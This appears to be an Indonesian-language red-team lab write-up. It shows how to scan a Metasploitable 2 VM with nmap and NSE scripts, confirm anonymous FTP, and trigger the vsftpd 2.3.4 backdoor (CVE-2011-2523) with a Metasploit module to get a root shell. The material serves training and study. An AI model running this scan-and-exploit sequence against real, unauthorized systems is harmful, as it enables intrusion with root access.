# Exploit vsftpd 2.3.4 Backdoor di Metasploitable 2 (CVE-2011-2523)

## Overview
vsftpd 2.3.4 adalah versi FTP daemon dengan backdoor tersembunyi pada koneksi port 6200/tcp yang memungkinkan command execution sebagai root. Di Metasploitable 2 (VM vulnerable Linux), port 21 (FTP) terbuka dengan anonymous access. Exploit ini melibatkan:
- **Nmap**: Scan port, operating system dan service detection.
- **NSE (Nmap Scripting Engine)**: Deteksi login pengguna anonymous dengan `ftp-anon.nse` dan backdoor dengan script `ftp-vsftpd-backdoor`.
- **Metasploit**: Trigger backdoor untuk shell root.

**Target**: Metasploitable 2 VM.  
**Risiko**: Hanya untuk lab etis; jangan gunakan di sistem produksi.

## Tools Used
<div style="display: flex; gap: 5px; flex-wrap: wrap;">
<img src="https://img.shields.io/badge/-Nmap-FF0000?style=flat&logo=nmap&logoColor=white" />
<img src="https://img.shields.io/badge/-NSE-FF0000?style=flat&logo=nmap&logoColor=white" />
<img src="https://img.shields.io/badge/-Metasploit-E23B23?style=flat&logo=metasploit&logoColor=white" />
</div>

## Steps
1. **Periksa IP Address pada Host Local**:
   > Command Line: `ip a` (tampilkan konfigurasi IP Address).
   
   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_33_27.png" alt="Network Configuration" width="80%" />

2. **Temukan Host Target**:
   > Command Line: `nmap -sn 192.168.56.0/24` (ping scan).
   
   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_34_48.png" alt="NMAP Ping Scan Result" width="80%" />

3. **Deteksi Ports Terbuka, Services dan Operating System**:
   > Command Line: `nmap -sS -sV -O 192.168.56.101` (SYN scan, service version dan operating system detection).

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_40_56.png" alt="NMAP Detection Result" width="80%" />

4. **Cari NMAP NSE untuk vsftpd**:
   > Command Line: `ls -al /usr/share/nmap/scripts | grep vsftpd` atau `ls -al /usr/share/nmap/scripts | grep ftp`.

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_44_37.png" alt="Filter NSE" width="80%" />

5. **Deteksi Login Anonymous**:
   > Command Line: `nmap --script=/usr/share/nmap/scripts/ftp-anon.nse 192.168.56.101 >> ftp-anon.txt` (NSE anonymous ftp login detection).

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_49_25.png" alt="NSE Anonymous Login Detection" width="80%" />

6. **Validasi Anonymous Login**:
   > Command Line: `tnftp 192.168.56.101`. <br />
   > Result: Login pengguna anonymous berhasil.

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_51_20.png" alt="vsftpd Anonymous Login" width="80%" />

7. **Deteksi Backdoor**:
   > Command Line: `nmap --script=/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse 192.168.56.101 >> vsftpd-backdoor.txt` (NSE vsftpd backdoor detection).

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_55_08.png" alt="NSE vsftpd backdoor Detection" width="80%" />

8. **Cari Module Exploit untuk Backdoor**:
   > Command Line: `searchsploit vsftpd` (search metasploit module untuk vsftpd).

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_56_27.png" alt="Search Metasploit Module" width="80%" />

9. **Exploit dengan Metasploit Framework**:
   > Buka metasploit framework: `sudo msfconsole`. <br />
   > Gunakan module: `use exploit/unix/ftp/vsftpd_234_backdoor`. <br />
   > Set options: `set RHOSTS 192.168.56.101`. <br />
   > Jalankan: `exploit`. <br />
   > Result: Backdoor triggered, dapat root shell (UID: uid=0(1000) gid=0(1000), target:192.168.56.101:6200).

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_10_59_21.png" alt="Run Metasploit Framework" width="80%" />

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_11_00_32.png" alt="Use a Module" width="80%" />

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_11_18_20.png" alt="Show Options" width="80%" />

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_11_20_07.png" alt="Set Options" width="80%" />

   <img src="../assets/vsftpd-exploit/Screenshot_2025-09-07_11_20_31.png" alt="Shell Retrieved" width="80%" />

## References
- [Metasploit Module](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [Nmap NSE Script](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)

[Back to Red Team Labs](https://github.com/lilulil-akbar/red-team-labs)
